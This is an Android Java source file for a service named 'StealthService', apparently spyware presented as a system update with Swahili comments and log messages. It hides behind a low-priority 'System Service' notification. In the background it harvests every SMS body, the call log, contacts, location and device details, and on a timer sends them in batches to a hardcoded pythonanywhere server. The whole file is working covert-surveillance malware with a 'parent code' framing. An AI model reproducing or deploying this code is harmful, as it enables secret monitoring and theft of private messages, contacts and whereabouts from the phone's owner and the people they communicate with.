package com.security.update;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Build;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private static final int NOTIFICATION_ID = 1234;
    private static final String CHANNEL_ID = "SystemServiceChannel";
    
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;

    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        Log.d(TAG, "🔍 StealthService imeanzishwa kwenye background...");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }

        startCompleteSurveillance();
        return START_STICKY;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "System Service",
                NotificationManager.IMPORTANCE_LOW
            );
            channel.setDescription("System background service");
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private Notification createNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        
        builder.setContentTitle("System Service")
               .setContentText("Running in background")
               .setSmallIcon(android.R.drawable.ic_menu_compass)
               .setPriority(Notification.PRIORITY_MIN)
               .setOngoing(true);
               
        return builder.build();
    }

    private void startCompleteSurveillance() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();

        // Start COMPLETE data collection immediately
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllCompleteData();
            }
        }, 10000);  // Anza baada ya sekunde 10

        // Schedule periodic data collection every 3 minutes (180000 ms)
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendNewData();
            }
        }, 180000, 180000); // 3 minutes = 180000 ms

        Log.d(TAG, "📡 Complete Surveillance imeanzishwa - data zote zitatumwa");
    }

    private void collectAndSendAllCompleteData() {
        try {
            Log.d(TAG, "🔄 Kuanza kukusanya DATA ZOTE ZOTE...");

            // 1. Kusanya SMS ZOTE
            if (checkPermission(Manifest.permission.READ_SMS)) {
                collectAndSendAllSMSData();
            }

            // 2. Kusanya SIMU ZOTE
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                collectAndSendAllCallsData();
            }

            // 3. Kusanya ANWANI ZOTE
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                collectAndSendAllContactsData();
            }

            // 4. Kusanya LOCATION
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                collectAndSendLocationData();
            }

            // 5. Tuma DEVICE INFO
            sendDeviceInfo();

            Log.d(TAG, "✅ Ukusaji wa DATA ZOTE umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting complete data: " + e.getMessage());
        }
    }

    private void collectAndSendNewData() {
        try {
            Log.d(TAG, "🔄 Kuanza kukusanya DATA MPYA...");

            // Kusanya data mpya tu (saa 24 zilizopita)
            long last24Hours = System.currentTimeMillis() - (24 * 60 * 60 * 1000);

            // SMS mpya
            if (checkPermission(Manifest.permission.READ_SMS)) {
                collectAndSendNewSMSData(last24Hours);
            }

            // Simu mpya
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                collectAndSendNewCallsData(last24Hours);
            }

            // Location mpya
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                collectAndSendLocationData();
            }

            Log.d(TAG, "✅ Ukusaji wa data mpya umekamilika");

        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting new data: " + e.getMessage());
        }
    }

    // 🆕 KUKUSANYA SMS ZOTE BILA KIKOMO
    private void collectAndSendAllSMSData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    Telephony.Sms.CONTENT_URI,
                    null, null, null,
                    Telephony.Sms.DATE + " ASC"  // ZOTE kutoka mwanzo
                );

                if (cursor != null) {
                    int totalCount = 0;
                    int batchCount = 0;
                    JSONArray smsBatch = new JSONArray();

                    while (cursor.moveToNext()) {
                        try {
                            JSONObject smsData = new JSONObject();
                            String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                            String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                            smsData.put("sender", address != null ? address : "Unknown");
                            smsData.put("message", body != null ? body : "");
                            smsData.put("timestamp", timestamp);
                            smsData.put("type", getSMSType(type));
                            smsData.put("readable_time", formatTime(timestamp));

                            smsBatch.put(smsData);
                            batchCount++;
                            totalCount++;

                            // Tuma batch kila SMS 50
                            if (batchCount >= 50) {
                                sendBatchDataToServer("sms_batch", smsBatch);
                                smsBatch = new JSONArray();
                                batchCount = 0;
                                Thread.sleep(2000);  // Pumzika kwa sekunde 2
                            }

                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing SMS: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho ikiwa imebaki
                    if (batchCount > 0) {
                        sendBatchDataToServer("sms_batch", smsBatch);
                    }

                    cursor.close();
                    Log.d(TAG, "✅ SMS ZOTE " + totalCount + " zimetumwa kikamilifu");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading all SMS: " + e.getMessage());
            }
        }).start();
    }

    // 🆕 KUKUSANYA SIMU ZOTE BILA KIKOMO
    private void collectAndSendAllCallsData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    CallLog.Calls.CONTENT_URI,
                    null, null, null,
                    CallLog.Calls.DATE + " ASC"  // ZOTE kutoka mwanzo
                );

                if (cursor != null) {
                    int totalCount = 0;
                    int batchCount = 0;
                    JSONArray callsBatch = new JSONArray();

                    while (cursor.moveToNext()) {
                        try {
                            JSONObject callData = new JSONObject();
                            String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                            long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                            long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                            int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                            callData.put("number", number != null ? number : "Unknown");
                            callData.put("duration", duration);
                            callData.put("timestamp", timestamp);
                            callData.put("type", getCallTypeText(type));
                            callData.put("readable_time", formatTime(timestamp));

                            callsBatch.put(callData);
                            batchCount++;
                            totalCount++;

                            // Tuma batch kila simu 50
                            if (batchCount >= 50) {
                                sendBatchDataToServer("calls_batch", callsBatch);
                                callsBatch = new JSONArray();
                                batchCount = 0;
                                Thread.sleep(2000);  // Pumzika kwa sekunde 2
                            }

                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing call: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho ikiwa imebaki
                    if (batchCount > 0) {
                        sendBatchDataToServer("calls_batch", callsBatch);
                    }

                    cursor.close();
                    Log.d(TAG, "✅ SIMU ZOTE " + totalCount + " zimetumwa kikamilifu");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading all calls: " + e.getMessage());
            }
        }).start();
    }

    // 🆕 KUKUSANYA ANWANI ZOTE BILA KIKOMO
    private void collectAndSendAllContactsData() {
        new Thread(() -> {
            try {
                Cursor cursor = getContentResolver().query(
                    ContactsContract.Contacts.CONTENT_URI,
                    null, null, null,
                    ContactsContract.Contacts.DISPLAY_NAME + " ASC"  // ZOTE
                );

                if (cursor != null) {
                    int totalCount = 0;
                    int batchCount = 0;
                    JSONArray contactsBatch = new JSONArray();

                    while (cursor.moveToNext()) {
                        try {
                            String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                            String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));

                            // Pata namba za simu za contact hii
                            String phoneNumber = getContactPhoneNumber(contactId);
                            
                            if (phoneNumber != null && !phoneNumber.isEmpty()) {
                                JSONObject contactData = new JSONObject();
                                contactData.put("name", name != null ? name : "Unknown");
                                contactData.put("phone", phoneNumber);
                                contactData.put("timestamp", System.currentTimeMillis());
                                contactData.put("readable_time", formatTime(System.currentTimeMillis()));

                                contactsBatch.put(contactData);
                                batchCount++;
                                totalCount++;

                                // Tuma batch kila anwani 50
                                if (batchCount >= 50) {
                                    sendBatchDataToServer("contacts_batch", contactsBatch);
                                    contactsBatch = new JSONArray();
                                    batchCount = 0;
                                    Thread.sleep(2000);  // Pumzika kwa sekunde 2
                                }
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "❌ Error processing contact: " + e.getMessage());
                        }
                    }

                    // Tuma batch ya mwisho ikiwa imebaki
                    if (batchCount > 0) {
                        sendBatchDataToServer("contacts_batch", contactsBatch);
                    }

                    cursor.close();
                    Log.d(TAG, "✅ ANWANI ZOTE " + totalCount + " zimetumwa kikamilifu");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Error reading all contacts: " + e.getMessage());
            }
        }).start();
    }

    // KUKUSANYA SMS MPYA (saa 24 zilizopita)
    private void collectAndSendNewSMSData(long sinceTime) {
        try {
            String selection = Telephony.Sms.DATE + " > ?";
            String[] selectionArgs = {String.valueOf(sinceTime)};

            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, selection, selectionArgs,
                Telephony.Sms.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject smsData = new JSONObject();
                        String address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS));
                        String body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE));

                        smsData.put("sender", address != null ? address : "Unknown");
                        smsData.put("message", body != null ? body : "");
                        smsData.put("timestamp", timestamp);
                        smsData.put("type", getSMSType(type));
                        smsData.put("readable_time", formatTime(timestamp));

                        sendSingleDataToServer("sms", smsData);
                        count++;
                        
                        Thread.sleep(500);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error processing new SMS: " + e.getMessage());
                    }
                }
                cursor.close();
                if (count > 0) {
                    Log.d(TAG, "✅ SMS mpya " + count + " zimetumwa");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading new SMS: " + e.getMessage());
        }
    }

    // KUKUSANYA SIMU MPYA (saa 24 zilizopita)
    private void collectAndSendNewCallsData(long sinceTime) {
        try {
            String selection = CallLog.Calls.DATE + " > ?";
            String[] selectionArgs = {String.valueOf(sinceTime)};

            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, selection, selectionArgs,
                CallLog.Calls.DATE + " DESC"
            );

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext()) {
                    try {
                        JSONObject callData = new JSONObject();
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        long timestamp = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));

                        callData.put("number", number != null ? number : "Unknown");
                        callData.put("duration", duration);
                        callData.put("timestamp", timestamp);
                        callData.put("type", getCallTypeText(type));
                        callData.put("readable_time", formatTime(timestamp));

                        sendSingleDataToServer("calls", callData);
                        count++;
                        
                        Thread.sleep(500);
                    } catch (Exception e) {
                        Log.e(TAG, "❌ Error processing new call: " + e.getMessage());
                    }
                }
                cursor.close();
                if (count > 0) {
                    Log.d(TAG, "✅ Simu mpya " + count + " zimetumwa");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error reading new calls: " + e.getMessage());
        }
    }

    private void collectAndSendLocationData() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null) {
                Location lastLocation = null;
                
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                
                if (lastLocation == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    lastLocation = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
                
                if (lastLocation != null) {
                    JSONObject locationData = new JSONObject();
                    locationData.put("latitude", lastLocation.getLatitude());
                    locationData.put("longitude", lastLocation.getLongitude());
                    locationData.put("accuracy", lastLocation.getAccuracy());
                    locationData.put("timestamp", lastLocation.getTime());
                    locationData.put("readable_time", formatTime(lastLocation.getTime()));
                    locationData.put("provider", lastLocation.getProvider());

                    sendSingleDataToServer("location", locationData);
                    Log.d(TAG, "✅ Location imetumwa kikamilifu");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
        }
    }

    private void sendDeviceInfo() {
        try {
            JSONObject deviceInfo = new JSONObject();
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));

            sendSingleDataToServer("device_info", deviceInfo);
            Log.d(TAG, "✅ Device info imetumwa kikamilifu");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error sending device info: " + e.getMessage());
        }
    }

    private String getContactPhoneNumber(String contactId) {
        try {
            Cursor phoneCursor = getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null,
                ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                new String[]{contactId},
                null
            );

            if (phoneCursor != null && phoneCursor.moveToFirst()) {
                String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                    ContactsContract.CommonDataKinds.Phone.NUMBER));
                phoneCursor.close();
                return phone;
            }
            if (phoneCursor != null) {
                phoneCursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting phone number: " + e.getMessage());
        }
        return null;
    }

    private String getCallTypeText(int callType) {
        switch (callType) {
            case CallLog.Calls.INCOMING_TYPE:
                return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:
                return "outgoing";
            case CallLog.Calls.MISSED_TYPE:
                return "missed";
            case CallLog.Calls.REJECTED_TYPE:
                return "rejected";
            default:
                return "unknown";
        }
    }

    private String getSMSType(int smsType) {
        switch (smsType) {
            case Telephony.Sms.MESSAGE_TYPE_INBOX:
                return "incoming";
            case Telephony.Sms.MESSAGE_TYPE_SENT:
                return "outgoing";
            case Telephony.Sms.MESSAGE_TYPE_DRAFT:
                return "draft";
            default:
                return "unknown";
        }
    }

    private String formatTime(long timestamp) {
        try {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());
            return sdf.format(new Date(timestamp));
        } catch (Exception e) {
            return "Unknown";
        }
    }

    // 🆕 NJIA MPYA YA KUTUMA BATCH DATA
    private void sendBatchDataToServer(String dataType, JSONArray dataBatch) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-batch-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_batch", dataBatch);
                postData.put("batch_size", dataBatch.length());
                postData.put("timestamp", System.currentTimeMillis());

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(30000);
                conn.setReadTimeout(30000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " batch ya " + dataBatch.length() + " imetumwa kikamilifu");
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + " batch: " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + " batch: " + e.getMessage());
            }
        }).start();
    }

    // NJIA YA KUTUMA DATA MOJA MOJA
    private void sendSingleDataToServer(String dataType, JSONObject dataContent) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/submit-data";
                
                JSONObject postData = new JSONObject();
                postData.put("parent_code", parentCode);
                postData.put("data_type", dataType);
                postData.put("device_id", android.os.Build.MODEL);
                postData.put("data_content", dataContent);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(20000);
                conn.setReadTimeout(20000);

                OutputStream os = conn.getOutputStream();
                os.write(postData.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ " + dataType + " imetumwa kikamilifu");
                } else {
                    Log.e(TAG, "❌ Server error for " + dataType + ": " + responseCode);
                }

            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending " + dataType + ": " + e.getMessage());
            }
        }).start();
    }

    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 StealthService imezimwa - data itaendelea kutumwa kwenye restart");
    }
}
